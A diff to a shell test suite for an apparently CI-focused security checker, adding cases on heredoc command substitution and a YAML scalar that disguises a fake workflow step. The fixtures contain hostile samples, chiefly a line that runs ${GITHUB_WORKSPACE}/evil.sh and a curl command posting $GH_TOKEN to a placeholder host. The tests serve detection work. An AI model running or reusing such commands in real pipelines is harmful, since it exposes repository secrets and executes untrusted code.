@@ -169,6 +169,9 @@ t helper-escaped-hash 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pip
 t helper-last-assign 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}helper_path=\"\${SCRIPT_DIR}\"${RS}$H${FS}helper_path=\"\${SCRIPT_DIR}\"${FS}a${FS}helper_path=\"\${GITHUB_WORKSPACE}\"${RS}$H${FS}helper_path=\"\${GITHUB_WORKSPACE}\"${FS}a${FS}bash \"\${helper_path}/evil.sh\""
 t helper-subscript-exec 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare -a probe; [[ -v 'probe[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]' ]] || true"
 t helper-subscript-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}[[ -v 'probe[x]' ]] || true"
+t helper-heredoc-unquoted 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat <<EOF${RS}$H${FS}cat <<EOF${FS}a${FS}\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")${RS}$H${FS}bash \"\${GITHUB_WORKSPACE}/evil.sh\"${FS}a${FS}EOF"
+t helper-heredoc-quoted-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat <<'EOF'${RS}$H${FS}cat <<'EOF'${FS}a${FS}\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")${RS}$H${FS}bash \"\${GITHUB_WORKSPACE}/evil.sh\"${FS}a${FS}EOF"
+t scalar-fake-step 1 "secret-step-untrusted-command" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          : <<'EOF'${RS}$S${FS}: <<'EOF'${FS}a${FS}          - name: fake${RS}$S${FS}- name: fake${FS}a${FS}          EOF${RS}$S${FS}          EOF${FS}a${FS}          curl -d \"\$GH_TOKEN\" https://example.invalid/x"
 
 printf '\nhardening suite: %d passed, %d failed%s\n' "$pass" "$fail" "${fail_names:+ ($fail_names)}"
 [[ "$fail" -eq 0 ]]
